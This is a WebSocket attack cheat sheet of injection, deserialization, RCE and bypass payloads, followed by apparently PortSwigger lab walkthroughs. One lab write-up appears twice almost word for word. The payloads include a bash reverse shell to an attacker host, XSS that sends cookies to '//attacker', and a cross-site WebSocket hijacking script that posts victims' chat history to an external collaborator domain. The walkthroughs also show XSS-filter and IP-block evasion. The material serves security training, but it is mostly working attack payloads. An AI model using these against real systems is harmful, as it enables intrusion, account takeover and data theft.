# **✅ WebSockets Security Testing – Complete Test Case (with Bypass Cases)**

1 No Authentication on WebSocket Upgrade

2 Weak / Missing Origin Validation (Origin Spoofing)

3 Cross-Site WebSocket Hijacking (CSWSH)

4 Message Tampering (No Signature / MAC)

5 WebSocket Injection (WS Command Injection)

6 WebSocket-based SQL/NoSQL Injection

7 WebSocket XSS Payload Reflection

8 Binary Message Injection

9 WebSocket CSRF (WSS/WS Hijacking)

10 Insecure WebSocket Server (Unauthenticated APIs)

11 JSON Deserialization Attacks over WebSocket

12 WebSocket Protocol Downgrade (wss → ws)

13 Bruteforcing Over WebSockets

14 WebSocket Message Flood / DoS

15 WebSocket Misconfiguration → RCE (Node.js)
---

# **2. Sample Payloads (Core Attack Payloads)**

*(Normal structured payload list)*

```
2.1 Basic Connection Attempt Without Auth
GET /ws HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Host: victim.com
```

```
2.2 Spoofed Origin Header
Origin: https://attacker.com
```

```
2.3 WebSocket Message Tampering
{"action":"getUser","id":"1 OR 1=1"}
```

```
2.4 WebSocket JSON Injection
{"cmd":"subscribe","channel":"notifications;DROP TABLE users;"}
```

```
2.5 WebSocket JS Injection (Reflected)
{"msg":"<img src=x onerror=alert(1)>"}
```

```
2.6 Binary Injection Payload
\x00\x01\x02\x03\xFF
```

```
2.7 Unauthorized Channel Subscription
{"subscribe":"adminChannel"}
```

```
2.8 Bruteforce / Enumeration Message
{"action":"getUser","id":"1001"}
```

```
2.9 File Read Attempt via WS Command
{"action":"read","path":"../../etc/passwd"}
```

```
2.10 WS Downgrade Attack
ws://victim.com/ws (instead of wss://)
```

---

# **3. Sample Payloads (Updated With Real Offensive Payloads)**

*(Real exploitation payloads used in WebSocket attacks)*

```
3.1 Full SQL Injection via WebSocket API
{"query":"SELECT * FROM users WHERE id=1 UNION SELECT null,username,password FROM users"}
```

```
3.2 NoSQL Injection via WS
{"filter":{"$ne":null},"password":{"$ne":""}}
```

```
3.3 RCE in Node.js WebSocket Handler
{"action":"exec","cmd":"require('child_process').exec('id')"}
```

```
3.4 XSS via WebSocket Chat App
{"message":"<script>fetch('//attacker/c?'+document.cookie)</script>"}
```

```
3.5 JWT Manipulation Over WS
{"token":"eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."}
```

```
3.6 Admin Channel Unauthorized Join
{"room":"admin","action":"join"}
```

```
3.7 Exfiltration Over WebSocket Channel
{"upload":"/etc/passwd"}
```

```
3.8 CSRF WebSocket Hijacking
new WebSocket("wss://victim.com/ws");
```

```
3.9 Python Pickle Payload via WebSocket
cos
system
(S"id")
tR.
```

```
3.10 Serialized PHP Object Injection Via WS
O:8:"Exploit":1:{s:3:"cmd";s:2:"id";}
```

---

# **4. Bypass Techniques (Origin, Filters, WAF, Sanitization)**

*(Same style as before — bypass payloads only)*

```
4.1 Origin Spoof Bypass
Origin: null
```

```
4.2 CORS Misconfig Bypass
Origin: https://allowed.com.attacker.com
```

```
4.3 Case-Insensitive Origin Header Bypass
oRiGiN: https://attacker.com
```

```
4.4 WebSocket Subprotocol Bypass
Sec-WebSocket-Protocol: chat, attacker-proto
```

```
4.5 Message Chunking Bypass
{"ac
tion":"get
User","id":"1"}
```

```
4.6 Base64 Encoded Payloads
eyJhY3Rpb24iOiJnZXRVc2VyIiwiaWQiOiIxIn0=
```

```
4.7 Double-JSON Encoding
"{\"action\":\"getUser\",\"id\":\"1 OR 1=1\"}"
```

```
4.8 Unicode Obfuscation
{"action":"getUser","\u0069d":"1"}
```

```
4.9 WS Compression Bypass (WebSocket-PerMessage-Deflate)
compressed malicious payload
```

```
4.10 Protocol Downgrade (Force ws)
ws://victim.com/ws
```

---

# **5. Advanced Attack Chains (Real-World CSWSH / RCE Chains)**

```
5.1 WebSocket → CSRF → Account Takeover
Attacker site forces victim browser to connect:
new WebSocket("wss://victim/ws");
```

```
5.2 WebSocket → NoSQL Injection → Dump Database
{"filter":{"$gt":""}}
```

```
5.3 WebSocket → Command Injection → Server RCE
{"cmd":";bash -i >& /dev/tcp/ATTACKER/4444 0>&1"}
```

```
5.4 WebSocket → XSS → Cookie Theft
{"msg":"<script>new Image().src='//attacker/c?'+document.cookie</script>"}
```

```
5.5 WebSocket → Prototype Pollution → Node RCE
{"__proto__":{"exec":"require('child_process').exec('id')"}}
```

```
5.6 WebSocket → Path Traversal → File Read
{"path":"../../../../etc/passwd"}
```

```
5.7 WebSocket → JWT Forgery → Privilege Escalation
{"token":"header.payload."}
```
---

# Manipulating WebSocket messages to exploit vulnerabilities

This online shop has a live chat feature implemented using WebSockets.

Chat messages that you submit are viewed by a support agent in real time.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

---------------------------------------------

Reference: https://portswigger.net/web-security/websockets

---------------------------------------------

Generated link: https://0a32005803392a6a81b1cb9d009d0044.web-security-academy.net/chat

Payload:

```
script><img src=1 onerror='alert(1)'></script>
```



![img](images/Manipulating%20WebSocket%20messages%20to%20exploit%20vulnerabilities/1.png)


# Manipulating the WebSocket handshake to exploit vulnerabilities

This online shop has a live chat feature implemented using WebSockets.

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

Hint: If you're struggling to bypass the XSS filter, try out our XSS labs. Sometimes you can bypass IP-based restrictions using HTTP headers like X-Forwarded-For.

---------------------------------------------

References: 

- https://portswigger.net/web-security/websockets

- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For





![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/1.png)
![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/2.png)

---------------------------------------------

Generated link: https://0ad6009d046afe8e89234bb0009e00bc.web-security-academy.net/


Using the payload from a previous lab I get an error because Javascript is detected:

```
script><img src=1 onerror='alert(1)'></script>
```






![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/3.png)
![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/4.png)

And the IP address gets blocked so we can not access “/chat”:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/5.png)

The X-Forwarded-For (XFF) request header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server.

We will try with 127.0.0.1 or localhost to find if the detection is evaded.

```
X-Forwarded-For: 127.0.0.1
```

If we add this HTTP header, we can access “/chat”:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/6.png)

In the options section I will add a rule to add this header to all requests:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/7.png)

But if we send it to repeater and try the payload, the attack is detected again and the chat ends:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/8.png)

Everytime this happens we must change the IP address in the X-Forwarded-For HTTP header.

<img src=x onerror=alert(1)>


“<script” closes the connection but “<ScRIpT” does not:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/9.png)

The same happens with “alert(1)” and "aLeRT(1)" or “alert`1`”:



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/10.png)

However, this payload is not working:

```
ScRIpT><ScRIpT>alert`1`</ScRIpT>
```

Finally it works but using the img with incorrect source payload:

```
ScRIpT><iMg sRc=x OnErRoR=alert`1`>
```



![img](images/Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/11.png)


# Cross-site WebSocket hijacking

This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.

---------------------------------------------

Reference: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

---------------------------------------------

The request to /chat does not contain a CSRF token:



![img](images/Cross-site%20WebSocket%20hijacking/1.png)


Before sending anything, the message “READY” is sent and the server responds:





![img](images/Cross-site%20WebSocket%20hijacking/2.png)
![img](images/Cross-site%20WebSocket%20hijacking/3.png)


Then it is possible to send messages:





![img](images/Cross-site%20WebSocket%20hijacking/4.png)
![img](images/Cross-site%20WebSocket%20hijacking/5.png)



Payload:

```
<script>
    var ws = new WebSocket('wss://0ab10034038a49a581f67501001e002b.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://v95x1aaxyvlt8fptdelcbw94ovumie63.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```






![img](images/Cross-site%20WebSocket%20hijacking/6.png)
![img](images/Cross-site%20WebSocket%20hijacking/7.png)


# 18 - Manipulating the WebSocket handshake to exploit vulnerabilities

This online shop has a live chat feature implemented using WebSockets.

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

Hint: If you're struggling to bypass the XSS filter, try out our XSS labs. Sometimes you can bypass IP-based restrictions using HTTP headers like X-Forwarded-For.

---------------------------------------------

References: 

- https://portswigger.net/web-security/websockets

- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For





![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/1.png)
![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/2.png)

---------------------------------------------

Generated link: https://0ad6009d046afe8e89234bb0009e00bc.web-security-academy.net/


Using the payload from a previous lab I get an error because Javascript is detected:

```
script><img src=1 onerror='alert(1)'></script>
```






![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/3.png)
![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/4.png)

And the IP address gets blocked so we can not access “/chat”:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/5.png)

The X-Forwarded-For (XFF) request header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server.

We will try with 127.0.0.1 or localhost to find if the detection is evaded.

```
X-Forwarded-For: 127.0.0.1
```

If we add this HTTP header, we can access “/chat”:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/6.png)

In the options section I will add a rule to add this header to all requests:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/7.png)

But if we send it to repeater and try the payload, the attack is detected again and the chat ends:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/8.png)

Everytime this happens we must change the IP address in the X-Forwarded-For HTTP header.

“<script” closes the connection but “<ScRIpT” does not:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/9.png)

The same happens with “alert(1)” and "aLeRT(1)" or “alert`1`”:



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/10.png)

However, this payload is not working:

```
ScRIpT><ScRIpT>alert`1`</ScRIpT>
```

Finally it works but using the img with incorrect source payload:

```
ScRIpT><iMg sRc=x OnErRoR=alert`1`>
```



![img](images/18%20-%20Manipulating%20the%20WebSocket%20handshake%20to%20exploit%20vulnerabilities/11.png)
